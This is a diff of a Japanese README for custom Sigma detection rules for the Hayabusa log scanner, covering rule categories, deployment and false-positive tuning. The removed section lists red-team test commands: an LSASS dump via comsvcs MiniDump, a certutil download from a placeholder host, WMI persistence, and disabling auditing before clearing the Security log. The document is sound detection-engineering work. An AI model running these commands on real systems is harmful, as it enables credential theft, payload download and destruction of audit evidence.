@@ -1,92 +1,59 @@
-# 高精度 / 低 FP カスタムルール
+# カスタム検知ルール
 
-`bin/rules/` 同梱の Hayabusa 標準ルールセットを **置き換えずに** 上乗せする、
-DFIR / 検知エンジニアリング向けの精選ルール集。すべて
+`rules-custom/` は、Hayabusa 標準ルールを置き換えずに上乗せする DFIR 向けの
+Sigma ルール群です。2026 年 11 月時点で **53 本**を収録しています。
 
-- 攻撃者が機能を保ったまま回避しづらい特徴 (`Image + CommandLine + Path` の AND)
-- ベンダー製品など正規利用が混入する箇所は明示的に除外
-- スコア基準・回避コスト・既知バイパス手段をメタデータに記載
-- ATT&CK タグ付き
-- `falsepositives:` を必ず記述
+## 設計方針
 
-を満たすよう設計してあります。
+- 攻撃者が目的を達成するために変えにくい特徴を、`Image` / `ParentImage` /
+  `CommandLine` / レジストリパス / イベント ID の組み合わせで検知する
+- 正常な管理操作やベンダー製品が混ざる箇所は `filter_*` で除外する
+- 各ルールに `falsepositives` と `references` を記載する
+- 100% のサンプルカバレッジではなく、高シグナルな検知と誤検知抑制のバランスを取る
 
-## ファイル一覧
+## 主なカテゴリ
 
-| ファイル | 目的 | レベル | エンジン依存 |
-|---|---|---|---|
-| [hayfx_lsass_comsvcs_minidump.yml](hayfx_lsass_comsvcs_minidump.yml) | comsvcs.dll MiniDump による LSASS ダンプ | critical | 標準 Sigma |
-| [hayfx_service_install_userwritable_path.yml](hayfx_service_install_userwritable_path.yml) | ユーザー書込可能パスへのサービス設置 | high | 標準 Sigma |
-| [hayfx_amsi_patch_triad.yml](hayfx_amsi_patch_triad.yml) | PowerShell AMSI バイパス (3 トークン一致) | high | 標準 Sigma |
-| [hayfx_certutil_remote_fetch.yml](hayfx_certutil_remote_fetch.yml) | certutil LOLBIN によるリモート取得 | critical | 標準 Sigma |
-| [hayfx_wmi_persistence_filter_to_consumer.yml](hayfx_wmi_persistence_filter_to_consumer.yml) | WMI 永続化シーケンス | high | **hayfx `correlate:` 拡張が必要** |
-| [hayfx_anti_forensics_clear_then_change.yml](hayfx_anti_forensics_clear_then_change.yml) | 監査ポリシ変更 → ログ消去シーケンス | critical | **hayfx `correlate:` 拡張が必要** |
+| カテゴリ | 例 |
+|---|---|
+| ClickFix / 偽 CAPTCHA | `hayfx_clickfix_runmru`, `hayfx_clickfix_pcalua`, `hayfx_clickfix_explorer_child` |
+| RMM 悪用 | `hayfx_rmm_suspicious_deployment` |
+| 横展開 | `hayfx_5145_*`, `hayfx_winrm_*`, `hayfx_wmiexec_admin_share`, `hayfx_dcom_*` |
+| 認証情報窃取 | `hayfx_lsass_*`, `hayfx_browser_credential_copy`, `hayfx_4703_*` |
+| 防御回避 | `hayfx_amsi_*`, `hayfx_defender_exclusion_tamper`, `hayfx_cloudflared_svchost` |
+| BYOVD | `hayfx_byovd_driver_user_path`, `hayfx_lookup_loldriver_load` |
+| 永続化 | `hayfx_service_*`, `hayfx_wmi_persistence_*`, `hayfx_4698_*` |
+| 痕跡隠蔽 / ランサム前兆 | `hayfx_af_*`, `hayfx_anti_forensics_*`, `hayfx_4826_*` |
+| 外部持ち出し | `hayfx_rclone_exfil`, `hayfx_bits_external_download` |
 
-「標準 Sigma」と書いたものは現状の `hayabusa.exe` でそのまま読み込めます。
-`correlate:` を使うルール 2 本は、本プロジェクトの **ステップ 4** で実装
-する独自エンジン拡張が必要です。今のうちに書いておくことで、エンジン
-完成時に即時実戦投入できます。
+## 配置
 
-## 設計指針 — なぜこれらが低 FP なのか
-
-### 1. 「攻撃者が変えるとコストが発生する特徴」を選ぶ
-- comsvcs.dll の `MiniDump` 関数名: 別の関数名にすると動かない
-- AMSI バイパスの 3 トークン: どれを欠いても機能を失う
-- 7045 + ユーザー書込パス: 攻撃に必要な「持続性」と背反する特徴
-
-### 2. 単一イベントに頼らず順序 / 共起で精度を底上げ
-- WMI 永続化: フィルタ作成だけでは検知過剰、`5860/5859 → 5861` の流れで初めて意図が見える
-- アンチフォレンジック: 1102 単独はノイズ、`4719 → 1102` で初めて攻撃的意図
-- これらは `correlate:` 拡張で本来の精度になる
-
-### 3. 既知の「正規にぶつかる例外」を YAML 内で先回り除外
-- comsvcs: System32 / SysWOW64 配下のみを対象に絞る
-- certutil: Microsoft PKI ドメインを除外
-- WMI binding: SCCM / CarbonBlack / CrowdStrike の文字列を除外
-- 7045: MSIInstaller / SetupHost を除外
-
-### 4. スコア値はメタ的シグナルで動的にブースト
-- 親プロセスが `explorer.exe`（人手起動）→ +5
-- 同窓に別の検知が並ぶ → corroborated_within() で +10〜+15
-- これは ARCHITECTURE.md §12 のスコアエンジン (Rust 側、未実装) で評価予定
-
-### 5. 必ず「攻撃者の回避コスト」を明記する
-回避が容易なら confidence を下げる。回避が困難ならスコア高め。これにより
-*手元のルールセットの強さ* が客観的に評価可能になる。
-
-## 標準 Sigma ルールを今すぐ試す
-
-```powershell
-# 標準ルール (4 本) を Hayabusa にロード
-& 'C:\COMSYS_hayabusa\bin\hayabusa-3.9.0-win-x64.exe' json-timeline `
-    -f 'C:\COMSYS_hayabusa\workspace\uploads\some.evtx' `
-    -r 'C:\COMSYS_hayabusa\rules-custom' `
-    -c 'C:\COMSYS_hayabusa\bin\rules\config' `
-    -L -o '.\custom-only.jsonl' `
-    -s -b --no-wizard
+```bash
+cp -f rules-custom/*.yml bin/rules/hayabusa/custom/
 ```
 
-GUI 側でこれらを読ませる場合は、`gui/server.py` の `build_hayabusa_argv()`
-内 `-r` に `rules-custom` を追加してください。
+GUI からスキャンする場合は `bin/rules` を参照するため、上記コピーだけで反映されます。
 
-## 拡張ルール (`correlate:`) を有効化するには
+## 単体確認
 
-ARCHITECTURE.md §8.1 のとおり、本プロジェクトのフォーク版 Hayabusa エンジンに
-`correlate:` パーサと 2-pass 評価器を実装する必要があります（ステップ 4）。
-それまでこれらの YAML は YAML としてのリント / レビュー対象として保管します。
+```bash
+./bin/hayabusa-fx-3.10.0.exe json-timeline \
+  -f /path/to/sample.evtx \
+  -r rules-custom \
+  -L -o /tmp/custom.jsonl \
+  -m low -q -K -b -C -w
+```
 
-## 想定される赤チーム検証
+ルールの構文エラーは `logs/errorlog-*.log` に出力されます。
 
-各ルールについて、最小限テストすべき PoC は以下:
+## 誤検知の調整
 
-| ルール | PoC コマンド (検証環境のみで実行) |
-|---|---|
-| comsvcs MiniDump | `rundll32.exe comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\x.dmp full` |
-| 7045 ユーザー書込パス | `sc.exe create svc1 binPath= "C:\Users\Public\bad.exe"` |
-| AMSI 3 トークン | 公開リポジトリ `S3cur3Th1sSh1t/Amsi-Bypass-Powershell` の任意 PS スクリプト |
-| certutil 取得 | `certutil.exe -urlcache -split -f https://example.invalid/x.bin x.bin` |
-| WMI 永続化 | `wmic /namespace:\\root\subscription PATH __EventFilter CREATE ...`（CommandLineEventConsumer をペアで作成） |
-| 4719 → 1102 | `auditpol /set /Category:* /success:disable` → `wevtutil cl Security` |
+- まず `min-level` を `medium` 以上にして運用を開始する
+- 管理ツール由来の検知は `filter_*` を環境に合わせて拡張する
+- 個別の正当業務は GUI の抑制（suppression）でホスト / ルール単位に除外する
+- 定期的にクリーンな基準ログへ適用し、ルール単位の FP 率を確認する
 
-すべて **隔離環境で実行** し、Hayabusa にスキャンさせて該当ルールが発火するか
-確認する想定です。
+## 注意
+
+- `correlate:` は使用していません。すべて単一イベントで評価できます。
+- ルールは検知の出発点です。アラート単体ではなく、前後のプロセス・認証・
+  ネットワークイベントと合わせて判断してください。
